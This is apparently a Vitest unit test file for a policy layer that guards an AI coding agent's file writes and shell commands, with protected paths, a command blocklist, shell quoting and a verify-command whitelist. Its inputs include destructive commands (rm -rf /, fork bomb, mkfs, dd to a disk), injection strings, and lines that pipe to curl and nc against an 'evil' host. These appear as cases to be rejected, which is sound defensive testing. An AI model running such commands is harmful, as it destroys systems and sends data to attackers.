import {
  type PolicyConfig,
  defaultPolicyConfig,
  resetPolicyConfig,
  setPolicyConfig,
} from "@/lib/policy/config";
import {
  beforeTool,
  decideCommand,
  decideWrite,
  isAllowedVerifyCommand,
  shellQuote,
} from "@/lib/policy/hooks";
import { afterEach, describe, expect, it } from "vitest";

/**
 * Stage A：判定纯函数单测（不触执行层）。
 * 覆盖默认宽松配置下的受保护路径 / 命令黑名单，以及正常路径 / 命令放行（不回归）。
 */

afterEach(() => resetPolicyConfig());

describe("decideWrite 受保护路径 (Stage A)", () => {
  it(".git/ 目录拒（含 ./ 前缀、子路径变体）", () => {
    expect(decideWrite(".git")).toEqual({ allow: false, reason: expect.stringContaining(".git") });
    expect(decideWrite(".git/config")).toMatchObject({ allow: false });
    expect(decideWrite("./.git/refs/heads/main")).toMatchObject({ allow: false });
  });

  it("正常 workspace 文件放行（不回归）", () => {
    expect(decideWrite("index.html")).toMatchObject({ allow: true });
    expect(decideWrite("src/main.js")).toMatchObject({ allow: true });
    expect(decideWrite("package.json")).toMatchObject({ allow: true });
    expect(decideWrite("./dist/bundle.js")).toMatchObject({ allow: true });
  });

  it("自定义 protectedPaths 生效", () => {
    const cfg: PolicyConfig = { ...defaultPolicyConfig, protectedPaths: [/^secrets\//] };
    expect(decideWrite("secrets/key.pem", cfg)).toMatchObject({ allow: false });
    expect(decideWrite("src/app.js", cfg)).toMatchObject({ allow: true });
  });
});

describe("decideCommand 高危命令 (Stage A)", () => {
  it("rm -rf 绝对路径 / 家目录拒", () => {
    expect(decideCommand("rm -rf /")).toMatchObject({ allow: false });
    expect(decideCommand("rm -rf /home/user")).toMatchObject({ allow: false });
    expect(decideCommand("rm -rf ~")).toMatchObject({ allow: false });
    expect(decideCommand("rm  -rf  /etc")).toMatchObject({ allow: false });
  });

  it("fork bomb / mkfs / dd 写块设备拒", () => {
    expect(decideCommand(":(){ :|:& };:")).toMatchObject({ allow: false });
    expect(decideCommand("mkfs.ext4 /dev/sda1")).toMatchObject({ allow: false });
    expect(decideCommand("dd if=/dev/zero of=/dev/sda bs=1M")).toMatchObject({ allow: false });
  });

  it("正常 npm / build / workspace 内清理放行（不回归）", () => {
    expect(decideCommand("npm install")).toMatchObject({ allow: true });
    expect(decideCommand("npx vite build")).toMatchObject({ allow: true });
    expect(decideCommand("rm -rf node_modules")).toMatchObject({ allow: true });
    expect(decideCommand("rm -rf dist")).toMatchObject({ allow: true });
    expect(decideCommand("echo hi")).toMatchObject({ allow: true });
  });
});

describe("beforeTool 分发 (Stage A)", () => {
  it("writeFile 路由到 decideWrite", () => {
    expect(beforeTool("writeFile", { path: ".git/config", content: "" })).toMatchObject({
      allow: false,
    });
    expect(beforeTool("writeFile", { path: "index.html", content: "" })).toMatchObject({
      allow: true,
    });
  });

  it("runCommand 路由到 decideCommand", () => {
    expect(beforeTool("runCommand", { command: "rm -rf /" })).toMatchObject({ allow: false });
    expect(beforeTool("runCommand", { command: "npm test" })).toMatchObject({ allow: true });
  });

  it("其余工具放行（readFile/listFiles/runTests/reportReady 不受 policy 约束）", () => {
    expect(beforeTool("readFile", { path: ".git/config" })).toMatchObject({ allow: true });
    expect(beforeTool("runTests", { command: "rm -rf /" })).toMatchObject({ allow: true });
    expect(beforeTool("reportReady", { summary: "" })).toMatchObject({ allow: true });
  });

  it("读取实时 policy 配置（setPolicyConfig 后生效）", () => {
    setPolicyConfig({ ...defaultPolicyConfig, protectedPaths: [/^lock\//] });
    expect(beforeTool("writeFile", { path: "lock/x" })).toMatchObject({ allow: false });
    expect(beforeTool("writeFile", { path: ".git/config" })).toMatchObject({ allow: true });
  });
});

describe("shellQuote 路径转义 (Phase 4-1 安全修复)", () => {
  it("普通路径单引号包裹", () => {
    expect(shellQuote("src/a.js")).toBe("'src/a.js'");
  });

  it("含单引号的路径正确转义（闭合 → 转义单引号 → 重开）", () => {
    expect(shellQuote("a'b.js")).toBe("'a'\\''b.js'");
  });

  it("含 shell 元字符的路径被整体包裹，注入无效化", () => {
    for (const evil of ["a.js; rm -rf /", "$(whoami).js", "`id`.js", "a&&b", "a|b"]) {
      const q = shellQuote(evil);
      expect(q.startsWith("'")).toBe(true);
      expect(q.endsWith("'")).toBe(true);
      // 元字符落在单引号内 → shell 视作字面量，不被解释为命令
      expect(q).toContain(evil);
    }
  });
});

describe("isAllowedVerifyCommand 白名单 (P1-21)", () => {
  it("放行已知测试/构建/lint 命令", () => {
    expect(isAllowedVerifyCommand("npm test")).toBe(true);
    expect(isAllowedVerifyCommand("pnpm test")).toBe(true);
    expect(isAllowedVerifyCommand("npx vitest run")).toBe(true);
    expect(isAllowedVerifyCommand("npm run build")).toBe(true);
    expect(isAllowedVerifyCommand("npm run lint --fix")).toBe(true);
  });

  it("拒绝含命令拼接的注入", () => {
    expect(isAllowedVerifyCommand("npm test; curl evil.com")).toBe(false);
    expect(isAllowedVerifyCommand("npm test && rm -rf /")).toBe(false);
    expect(isAllowedVerifyCommand("npm test | nc evil 4444")).toBe(false);
  });

  it("拒绝非白名单命令", () => {
    expect(isAllowedVerifyCommand("curl evil.com")).toBe(false);
    expect(isAllowedVerifyCommand("/bin/sh -c 'x'")).toBe(false);
    expect(isAllowedVerifyCommand("bash deploy.sh")).toBe(false);
  });
});
